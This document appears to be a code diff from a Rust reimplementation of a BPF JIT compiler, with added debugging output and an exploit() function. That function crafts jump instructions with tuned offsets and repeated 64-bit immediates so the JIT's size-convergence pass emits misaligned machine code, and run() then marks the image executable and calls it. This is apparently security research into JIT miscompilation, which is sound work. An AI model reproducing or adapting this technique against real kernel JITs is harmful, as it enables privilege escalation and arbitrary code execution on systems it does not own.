@@ -109,7 +109,7 @@ impl BpfRegT {
     }
 }
 
-#[derive(arbitrary::Arbitrary, Debug)]
+#[derive(arbitrary::Arbitrary, Debug, Clone)]
 pub struct BpfInstT {
     pub opc: u8,
     pub regs: u8, /* dreg, sreg 4 bits each */
@@ -489,8 +489,13 @@ pub fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u
         oimg[0..clen].copy_from_slice(&PROLOGUE);
     }
 
+    let mut ilens = Vec::new();
+    let mut ja_offsets = Vec::new();
+
     let mut cidx = 0;
     while cidx < b_inst.len() {
+        let cidx_clone = cidx;
+
         let mut ilen: usize = 0;
         let mut image: [u8; 128] = [0; 128];
 
@@ -791,6 +796,7 @@ pub fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u
                 } else {
                     addrs[((cidx + 1) as i16 + cinst.off) as usize] as i64 - addrs[cidx + 1] as i64
                 };
+                ja_offsets.push(jmpoff);
 
                 if jmpoff != 0 {
                     if is_imm8!(jmpoff) {
@@ -823,7 +829,13 @@ pub fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u
         addrs[cidx + 1] = clen as u32;
 
         cidx += 1;
+
+        ilens.push(ilen);
+        // println!("{:?}\t{}\t{}", b_inst[cidx_clone].opc, ilen, addrs[cidx_clone] - PROLOGUELEN as u32);
     }
+
+    println!("BpfJa offsets: {:?}", ja_offsets);
+    println!("ilens: {:?}", ilens);
 
     if let Some(ref mut oimg) = outimg {
         oimg[clen..clen+EPILOGUELEN].copy_from_slice(&EPILOGUE);
@@ -975,12 +987,32 @@ fn print_all() {
     let mut image: Vec<u8> = vec![0; size];
     let x = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();
 
-    disas(&image[0..x], "x")
+    disassemble(&image[0..x], "x")
 }
 
-fn disas(code: &[u8], name: &str) {
-    let f1 = &format!("out_{}", name);
-    let f2 = &format!("out2_{}", name);
+fn disassemble_some_instructions() {
+    let instructions = vec![
+        BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
+        BpfInstT { opc: 0x18, regs: 0, off: 0, imm: 0xb3b2b1b0u32 as i32 },
+        BpfInstT { opc: 0,    regs: 0, off: 0, imm: 0xb7b6b5b4u32 as i32 },
+        BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
+    ];
+
+    let plen = PROLOGUELEN as u32;
+    let mut addrs: Vec<u32> = (0..instructions.len() + 1).map(|i| plen + 64 * i as u32).collect();
+
+    let size = PROLOGUELEN + 1000000 + 8 * instructions.len() + EPILOGUELEN;
+    let mut image: Vec<u8> = vec![0; size];
+
+    // one time is enough
+    let output_size = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();
+
+    disassemble(&image[PROLOGUELEN..output_size - EPILOGUELEN], "some_instructions")
+}
+
+fn disassemble(code: &[u8], name: &str) {
+    let f1 = &format!("{}.machine_code", name);
+    let f2 = &format!("{}.assembly", name);
 
     std::fs::File::create(f1).unwrap().write_all(code).unwrap();
 
@@ -994,34 +1026,65 @@ fn disas(code: &[u8], name: &str) {
     std::fs::write(f2, out.stdout.as_slice()).unwrap();
 }
 
+fn add_immediate(space: &mut Vec<BpfInstT>, value: u64) {
+    // make sure that this will be 8 bytes
+    assert!(!is_uimm32!(value));
+    space.push(BpfInstT { opc: 0x18, regs: 0, off: 0, imm: value as u32 as i32 });
+    space.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
+}
+
 fn exploit() {
-    let mut instructions: Vec<BpfInstT> = Vec::with_capacity(u16::MAX as usize);
-    // instructions.push(BpfInstT { opc: 7, regs: 0, off: 0, imm: 0 });
-    // instructions.push(BpfInstT { opc: 6, regs: 0, off: 0, imm: 0 });
-    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 0, imm: 0 });
-    // instructions.push(BpfInstT { opc: 36, regs: 1, off: 0, imm: 0 });
+    let mut instructions = vec![];
 
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 64, imm: 0 }); // 2 bytes after third iteration
-    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 64, imm: 0 }); // 2 bytes after second iteration
-    //
-    // for i in 0..64 {
-    //     instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 }); // 2 bytes after first iteration
-    // }
+    // shrink 2
+    // off: 5 2 10 2 bytes
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });
 
+    // shrink 1
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
+
+    for _ in 0..11 {
+        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
+    }
+
+    let n = 9;
+    for _ in 0..n {
+        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+    }
+
+    // off: 2|5 2 10
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - n - 10*2, imm: 0 });
 
     run(&instructions);
 }
 
-fn main() {
-    if true {
-        // posible_sizes();
-        // return;
-    }
+fn sizeof(i: &BpfInstT) -> usize {
+    let mut instructions: Vec<BpfInstT> = Vec::with_capacity(u16::MAX as usize);
+    instructions.push(i.clone());
+    instructions.push(i.clone());
 
-    if true {
-        // print_all();
-        // return;
-    }
+    let plen = PROLOGUELEN as u32;
+    let mut addrs: Vec<u32> = (0..instructions.len() + 1).map(|i| plen + 64 * i as u32).collect();
+    let size = PROLOGUELEN + 1000 + 8 * instructions.len() + EPILOGUELEN;
+    let mut image: Vec<u8> = vec![0; size];
+    let x = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();
+    let size = (x - PROLOGUELEN - EPILOGUELEN) / 2;
+
+    println!("sizeof {:?} is {} bytes", i, size);
+    size
+}
+
+fn main() {
+    // disassemble_some_instructions();
+    // return;
+
+    // posible_sizes();
+    // return;
+
+    // print_all();
+    // return;
 
     exploit();
     return;
@@ -1060,14 +1123,18 @@ pub fn run(insts: &Vec<BpfInstT>) {
     let mut olen = insts.len() * 64;
     let plen = PROLOGUELEN as u32;
     let mut addrs: Vec<u32> = (0..insts.len() + 1).map(|i| plen + 64 * i as u32).collect();
+    let mut addrs_clone = addrs.clone();
 
     let mut flag = false;
 
     println!("olen {} {:?}", olen, addrs);
     for _ in 0..20 {
+        addrs_clone.copy_from_slice(&addrs);
+
         if let Some(nlen) = do_jit(&insts, &mut addrs, None) {
-            println!("nlen {} {:?}", nlen, addrs);
+            println!("nlen {}", nlen);
             if nlen == olen {
+                println!("flag=true, (addrs==addrs_clone) is {}", addrs == addrs_clone);
                 flag = true;
                 break;
             }
@@ -1087,7 +1154,7 @@ pub fn run(insts: &Vec<BpfInstT>) {
 
                 final_buffer.as_mut().copy_from_slice(&image);
 
-                disas(&image[0..nlen], "run");
+                disassemble(&image[0..nlen], "run");
 
                 let final_buffer = final_buffer.make_exec().unwrap();
                 let func = unsafe {
